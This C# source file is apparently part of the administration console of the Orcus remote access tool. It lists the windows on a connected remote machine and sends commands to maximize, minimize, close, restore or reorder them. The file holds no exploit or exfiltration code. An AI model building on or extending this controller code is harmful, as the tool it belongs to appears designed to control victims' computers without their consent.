using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.WindowManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.WindowManager
{
    [DescribeCommandByEnum(typeof (WindowManagerCommunication))]
    public class WindowManagerCommand : Command
    {
        private List<AdvancedWindowInformation> _allWindows;

        public List<AdvancedWindowInformation> Windows { get; private set; }

        public event EventHandler<List<AdvancedWindowInformation>> WindowsReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((WindowManagerCommunication) parameter[0])
            {
                case WindowManagerCommunication.ResponseWindows:
                    _allWindows = new Serializer(typeof (List<AdvancedWindowInformation>))
                        .Deserialize<List<AdvancedWindowInformation>>(
                            parameter, 1);
                    _allWindows[0].Caption = (string) Application.Current.Resources["DesktopWindow"];
                    RecreateList();
                    WindowsReceived?.Invoke(this, Windows);
                    LogService.Receive(string.Format((string) Application.Current.Resources["WindowsReceived"],
                        _allWindows.Count));
                    break;
                case WindowManagerCommunication.ResponseWindowMaximized:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowMaximized"]);
                    break;
                case WindowManagerCommunication.ResponseWindowMaximizingFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseWindowMaximizedFailed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowMinimized:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowMinimized"]);
                    break;
                case WindowManagerCommunication.ResponseWindowMinimizingFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseWindowMinimizedFailed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowBroughtToFront:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowBroughtToFront"]);
                    break;
                case WindowManagerCommunication.ResponseWindowBringToFrontFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseWindowBroughtToFrontFailed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowIsTopmost:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowMadeTopmost"]);
                    break;
                case WindowManagerCommunication.ResponseMakeWindowTopmostFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseWindowMakeTopmostFailed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowClosed:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowClosed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowRestored:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowRestored"]);
                    break;
                case WindowManagerCommunication.ResponseWindowRestoringFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseWindowRestoredFailed"]);
                    break;
                case WindowManagerCommunication.ResponseWindowLostTopmost:
                    LogService.Receive((string) Application.Current.Resources["ResponseWindowLostTopmost"]);
                    break;
                case WindowManagerCommunication.ResponseWindowLostTopmostFailed:
                    LogService.Error((string)Application.Current.Resources["ResponseWindowLostTopmostFailed"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetAllWindows()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) WindowManagerCommunication.GetAllWindows});
            LogService.Send((string) Application.Current.Resources["GetAllWindows"]);
        }

        public void MaximizeWindow(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.MaximizeWindow);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendMaximizeWindow"],
                advancedWindowInformation.Caption));
        }

        public void MinimizeWindow(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.MinimizeWindow);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendMinimizeWindow"],
                advancedWindowInformation.Caption));
        }

        public void RestoreWindow(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte)WindowManagerCommunication.RestoreWindow);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string)Application.Current.Resources["SendRestoreWindow"],
                advancedWindowInformation.Caption));
        }

        public void BringWindowToFront(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.BringToFront);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendBringWindowToFront"],
                advancedWindowInformation.Caption));
        }

        public void MakeWindowTopmost(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.MakeTopmost);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendMakeWindowTopmost"],
                advancedWindowInformation.Caption));
        }

        public void MakeWindowLoseTopmost(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.MakeWindowLoseTopmost);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendMakeWindowLoseTopmost"],
                advancedWindowInformation.Caption));
        }

        public void CloseWindow(AdvancedWindowInformation advancedWindowInformation)
        {
            ConnectionInfo.UnsafeSendCommand(this, 9, writer =>
            {
                writer.Write((byte) WindowManagerCommunication.CloseWindow);
                writer.Write(advancedWindowInformation.Handle);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["SendCloseWindow"],
                advancedWindowInformation.Caption));
        }

        private void RecreateList()
        {
            var windowInformations = new List<AdvancedWindowInformation>();
            foreach (var advancedWindowInformation in _allWindows)
            {
                var advancedWindowInformations = new List<AdvancedWindowInformation>();
                if (string.IsNullOrEmpty(advancedWindowInformation.Caption))
                    advancedWindowInformation.Caption = $"<{Application.Current.Resources["NoCaption"]}>";
                foreach (var processInfo in _allWindows)
                {
                    if (processInfo.ParentHandle == advancedWindowInformation.Handle && processInfo.ParentHandle != 0)
                    {
                        advancedWindowInformations.Add(processInfo);
                        windowInformations.Add(processInfo);
                    }
                }

                advancedWindowInformation.ChildWindows = advancedWindowInformations;
            }

            Windows = _allWindows.Where(x => x.Handle == 0 || !windowInformations.Contains(x)).ToList();
        }

        protected override uint GetId()
        {
            return 29;
        }
    }
}